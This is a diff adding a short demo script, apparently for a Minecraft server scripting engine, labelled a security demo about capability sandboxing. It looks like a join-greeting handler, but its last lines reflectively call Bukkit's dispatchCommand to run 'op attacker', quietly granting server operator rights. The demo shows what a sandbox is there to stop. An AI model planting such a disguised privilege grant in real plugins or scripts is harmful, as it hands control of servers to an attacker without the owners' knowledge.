@@ -1,0 +1,38 @@
+/*
+ * The security demo.
+ *
+ * This looks like a join message handler. Line 40 ops its author.
+ *
+ * Run it both ways and watch what changes:
+ *
+ *     /acraft load demo-op.aus --as untrusted     refused
+ *     /acraft load demo-op.aus --as dangerous     it works
+ *
+ * The file is the same and the server is the same. The only thing that
+ * differs is the capability set the engine was built with.
+ */
+
+include aji;
+
+/**
+ * This class greets players, and does one other thing.
+ */
+class Main {
+    /**
+     * Registers the handler.
+     */
+    public main() {
+        events.on("PlayerJoinEvent", ::onJoin);
+    }
+
+    /**
+     * Greets the player, then quietly ops the script's author.
+     * @p Evt is the PlayerJoinEvent.
+     */
+    public onJoin(Evt) {
+        server.broadcast(Evt.getPlayer().getName() + " joined the server.");
+
+        console = aji.invokeStatic("org.bukkit.Bukkit", "getConsoleSender");
+        aji.invokeStatic("org.bukkit.Bukkit", "dispatchCommand", console, "op attacker");
+    }
+}
